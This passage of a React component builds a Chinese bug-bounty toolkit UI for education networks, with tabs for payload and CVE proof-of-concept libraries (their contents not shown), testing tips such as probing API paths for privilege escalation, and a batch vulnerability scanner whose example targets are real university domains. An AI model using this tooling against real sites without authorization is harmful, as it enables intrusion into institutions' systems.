  { title: 'API接口测试', content: '移动端API、第三方接口往往鉴权较弱.使用Burp抓包分析API，尝试: 越权访问、参数篡改、未授权接口.关注: /api/v1/user, /api/admin, /api/internal等路径.', icon: '🔌', tag: 'api' },
];

const EduSRCManager: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'pocs' | 'cve' | 'platforms' | 'tips' | 'batch'>('pocs');
  const [selectedCategory, setSelectedCategory] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [copiedPayload, setCopiedPayload] = useState<string | null>(null);
  const [batchTarget, setBatchTarget] = useState('');
  const [batchScanning, setBatchScanning] = useState(false);
  const [testUrl, setTestUrl] = useState('');
  const [testingPayload, setTestingPayload] = useState<string | null>(null);

  const copyPayload = (payload: string) => {
    navigator.clipboard.writeText(payload);
    setCopiedPayload(payload);
    setTimeout(() => setCopiedPayload(null), 2000);
  };

  const handleBatchScan = async () => {
    if (!batchTarget.trim()) { alert('请输入目标域名'); return; }
    setBatchScanning(true);
    try {
      const targets = batchTarget.split('\n').map(t => t.trim()).filter(Boolean).slice(0, 20);
      for (const t of targets) {
        await fetch(`http://localhost:8081/api/v1/active-scans`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ name: `EDU-SRC-${t}`, target: t.startsWith('http') ? t : `https://${t}`, type: 'vuln', options: { timeout: 45, concurrency: 12 } }),
        });
        await new Promise(r => setTimeout(r, 300));
      }
      alert(`✅ 已创建 ${targets.length} 个扫描任务！`);
    } catch (e) {
      console.error(e);
      alert('❌ 扫描失败，请检查后端服务');
    } finally { setBatchScanning(false); }
  };

  const testPayloadDirect = async (payload: string, category: string) => {
    if (!testUrl.trim()) {
      alert('请先输入测试URL');
      return;
    }
    setTestingPayload(payload);
    try {
      const response = await fetch(testUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ payload, category }),
      });
      const result = await response.json();
      alert(`测试完成！ 响应: ${JSON.stringify(result).substring(0, 200)}`);
    } catch (e) {
      alert(`测试请求发送失败: ${e}`);
    } finally {
      setTimeout(() => setTestingPayload(null), 3000);
    }
  };

  const filteredCategories = Object.keys(POC_DATABASE).filter(key => 
    searchQuery ? key.toLowerCase().includes(searchQuery.toLowerCase()) || 
    POC_DATABASE[key as any].label.toLowerCase().includes(searchQuery.toLowerCase()) ||
    POC_DATABASE[key as any].payloads?.some(p => 
      p.payload.toLowerCase().includes(searchQuery.toLowerCase()) ||
      p.desc?.toLowerCase().includes(searchQuery.toLowerCase())
    ) : true
  );

  const totalPayloads = Object.values(POC_DATABASE).reduce((sum, cat) => sum + (cat.payloads?.length || 0), 0);

  return (
    <div className="h-full overflow-auto bg-gray-950">
      <div className="border-b border-gray-800 bg-gray-900 sticky top-0 z-10">
        <nav className="flex px-4">
          {[
            { key: 'pocs' as const, label: 'POC库', icon: '🔓', count: `${Object.keys(POC_DATABASE).length}类` },
            { key: 'cve' as const, label: 'CVE POC', icon: '🆘', count: `${CVE_POC_DATABASE.length}个` },
            { key: 'platforms' as const, label: 'SRC平台', icon: '🏛️', count: `${SRC_PLATFORMS.length}个` },
            { key: 'tips' as const, label: '挖洞技巧', icon: '📚', count: `${EDU_TIPS.length}条` },
            { key: 'batch' as const, label: '批量扫描', icon: '🚀', count: '' },
          ].map(tab => (
            <button
              key={tab.key}
              onClick={() => setActiveTab(tab.key)}
              className={`py-3 px-4 border-b-2 font-medium text-sm transition-colors ${
                activeTab === tab.key ? 'border-cyan-500 text-cyan-400' : 'border-transparent text-gray-500 hover:text-gray-300'
              }`}
            >
              <span className="mr-1.5">{tab.icon}</span>
              {tab.label}
              {tab.count && <span className="ml-1 text-xs text-gray-600">({tab.count})</span>}
            </button>
          ))}
        </nav>
      </div>

      <div className="p-5">
        {activeTab === 'pocs' && (
          <div className="space-y-4">
            <div className="flex items-center justify-between mb-3">
              <div>
                <h3 className="text-white font-semibold">🔓 全网POC库</h3>
                <p className="text-xs text-gray-500 mt-1">{Object.keys(POC_DATABASE).length} 类漏洞 · {totalPayloads} 个Payload · 专家级</p>
              </div>
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="🔍 搜索漏洞类型/Payload..."
                className="px-3 py-1.5 bg-gray-800 border border-gray-700 rounded-lg text-sm text-white placeholder-gray-500 focus:border-cyan-500 outline-none w-64"
              />
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
              {filteredCategories.map((key) => {
                const cat = POC_DATABASE[key];
                return (
                  <div
                    key={key}
                    className={`bg-gray-900 rounded-lg border overflow-hidden transition ${
                      selectedCategory === key ? 'border-cyan-500 ring-1 ring-cyan-500/30' : 'border-gray-800 hover:border-gray-700'
                    }`}
                  >
                    <div
                      className={`p-3 cursor-pointer ${cat.bg}`}
                      onClick={() => setSelectedCategory(selectedCategory === key ? null : key)}
                    >
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <span className="text-xl">{cat.icon}</span>
                          <span className={`font-semibold text-sm ${cat.color}`}>{cat.label}</span>
                        </div>
                        <div className="flex items-center gap-2">
                          <span className="text-xs text-gray-500">{cat.payloads?.length || 0} payloads</span>
                          <span className={`transition-transform ${selectedCategory === key ? 'rotate-90' : ''}`}>▶</span>
                        </div>
                      </div>
                    </div>

                    {selectedCategory === key && cat.payloads && (
                      <div className="p-3 space-y-2 bg-gray-950/50">
                        {cat.payloads.map((p, i) => (
                          <div key={i} className="group">
                            <div className="flex items-center justify-between mb-1">
                              <span className="text-xs text-white font-medium">{p.name}</span>
                              <span className="text-[10px] text-gray-500">{p.desc}</span>
                            </div>
                            <div className="flex items-center gap-2">
                                <pre className={`flex-1 bg-gray-950 rounded px-2 py-1.5 text-[11px] font-mono ${cat.color} overflow-x-auto whitespace-pre-wrap break-all ${
                                  copiedPayload === p.payload ? 'ring-1 ring-green-500' : ''
                                }`}>{p.payload}</pre>
                                <button
                                  onClick={() => copyPayload(p.payload)}
                                  className={`shrink-0 px-2 py-1 rounded text-[10px] transition ${
                                    copiedPayload === p.payload ? 'bg-green-600 text-white' : 'bg-gray-800 text-gray-500 hover:text-cyan-400'
                                  }`}
                                >
                                  {copiedPayload === p.payload ? '✅' : '复制'}
                                </button>
                              </div>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  );
              })}
            </div>
          </div>
        )}

        {activeTab === 'cve' && (
          <div className="space-y-4">
            <div className="flex items-center justify-between mb-3">
              <h3 className="text-white font-semibold">🆘 最新CVE POC库</h3>
              <span className="text-xs text-gray-500">{CVE_POC_DATABASE.length} 个高危CVE · 含POC</span>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              {CVE_POC_DATABASE.map((cve) => (
                <div key={cve.id} className="bg-gray-900 rounded-lg border border-gray-800 p-4 hover:border-gray-700 transition">
                  <div className="flex items-center justify-between mb-2">
                    <div className="flex items-center gap-2">
                      <span className={`px-2 py-0.5 rounded text-[10px] font-mono ${
                        cve.severity === 'critical' ? 'bg-red-600/20 text-red-400' : 'bg-orange-600/20 text-orange-400'
                      }`}>{cve.id}</span>
                      <span className="text-sm text-white font-medium">{cve.name}</span>
                    </div>
                    <span className={`px-2 py-0.5 rounded text-[10px] ${
                      cve.severity === 'critical' ? 'bg-red-600/20 text-red-400' : 'bg-orange-600/20 text-orange-400'
                    }`}>{cve.severity.toUpperCase()}</span>
                  </div>
                  <p className="text-xs text-gray-400 mb-2">{cve.desc}</p>
                  <div className="bg-gray-950 rounded p-2 text-[10px] font-mono text-cyan-400 whitespace-pre-wrap break-all">
                    {cve.poc}
                  </div>
                  <div className="flex items-center justify-between mt-2">
                    <span className="text-[10px] text-gray-500">影响版本: {cve.affected}</span>
                    <button
                      onClick={() => copyPayload(cve.poc)}
                      className="text-[10px] text-cyan-400 hover:text-cyan-300"
                    >
                      复制POC
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {activeTab === 'platforms' && (
          <div className="space-y-4">
            <h3 className="text-white font-semibold">🏛️ 安全响应平台(SRC)</h3>
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-gray-800 text-left text-xs text-gray-500 uppercase tracking-wider">
                    <th className="pb-3 pr-4">平台名称</th>
                    <th className="pb-3 pr-4">奖励范围</th>
                    <th className="pb-3 pr-4 hidden md:table-cell">测试范围</th>
                    <th className="pb-3 pr-4">难度</th>
                    <th className="pb-3">操作</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-800/50">
                  {SRC_PLATFORMS.map((p, i) => (
                    <tr key={i} className="hover:bg-gray-900/50 transition">
                      <td className="py-3 pr-4">
                        <div className="font-medium text-white text-sm">{p.name}</div>
                        <div className="text-xs text-cyan-400 font-mono truncate max-w-[200px]">{p.url}</div>
                      </td>
                      <td className="py-3 pr-4 text-xs text-yellow-400 font-medium">{p.reward}</td>
                      <td className="py-3 pr-4 hidden md:table-cell text-xs text-gray-400 font-mono">{p.scope}</td>
                      <td className="py-3 pr-4 text-sm">{p.level}</td>
                      <td className="py-3">
                        <a href={p.url} target="_blank" rel="noopener noreferrer" className="px-2.5 py-1 bg-cyan-600/20 text-cyan-400 rounded text-xs hover:bg-cyan-600/30 transition inline-block">访问 →</a>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {activeTab === 'tips' && (
          <div className="space-y-3">
            <h3 className="text-white font-semibold">📚 教育网渗透测试专家技巧</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              {EDU_TIPS.map((tip, i) => (
                <div key={i} className="bg-gray-900 rounded-lg border border-gray-800 p-4 hover:border-gray-700 transition">
                  <div className="flex items-center gap-2 mb-2">
                    <span className="text-lg">{tip.icon}</span>
                    <h4 className="font-semibold text-white text-sm">{tip.title}</h4>
                    <span className="ml-auto px-1.5 py-0.5 bg-gray-800 rounded text-[10px] text-gray-500">#{String(i + 1).padStart(2, '0')}</span>
                  </div>
                  <p className="text-xs text-gray-400 leading-relaxed">{tip.content}</p>
                  <span className="inline-block mt-2 px-2 py-0.5 bg-gray-800 rounded text-[10px] text-cyan-400">{tip.tag.toUpperCase()}</span>
                </div>
              ))}
            </div>
          </div>
        )}

        {activeTab === 'batch' && (
          <div className="max-w-2xl mx-auto space-y-6">
            <div className="text-center mb-6">
              <div className="text-4xl mb-3">🚀</div>
              <h3 className="text-xl font-bold text-white">教育网批量扫描</h3>
              <p className="text-sm text-gray-400 mt-1">输入多个目标域名，一键创建批量扫描任务</p>
            </div>
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-400 mb-2">目标列表 (每行一个域名)</label>
                <textarea
                  value={batchTarget}
                  onChange={(e) => setBatchTarget(e.target.value)}
                  placeholder={`示例:\ntsinghua.edu.cn\npku.edu.cn\nzju.edu.cn\nfudan.edu.cn\n...`}
                  className="w-full h-40 px-4 py-3 bg-gray-900 border border-gray-700 rounded-lg text-sm text-white font-mono placeholder-gray-600 focus:border-cyan-500 outline-none resize-none"
                />
                <p className="text-xs text-gray-500 mt-1">支持最多20个目标，每个目标将创建独立的漏洞扫描任务</p>
              </div>
              <button
                onClick={handleBatchScan}
                disabled={batchScanning || !batchTarget.trim()}
                className={`w-full py-3 rounded-lg font-bold text-base transition ${
                  batchScanning ? 'bg-yellow-600 text-white animate-pulse' : 'bg-gradient-to-r from-red-600 to-orange-600 hover:from-red-500 hover:to-orange-500 text-white'
                } disabled:opacity-50 disabled:cursor-not-allowed`}
              >
                {batchScanning ? '⏳ 正在创建扫描任务...' : `🚀 开始批量扫描 (${batchTarget.split('\n').filter(t => t.trim()).length} 个目标)`}
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default EduSRCManager;
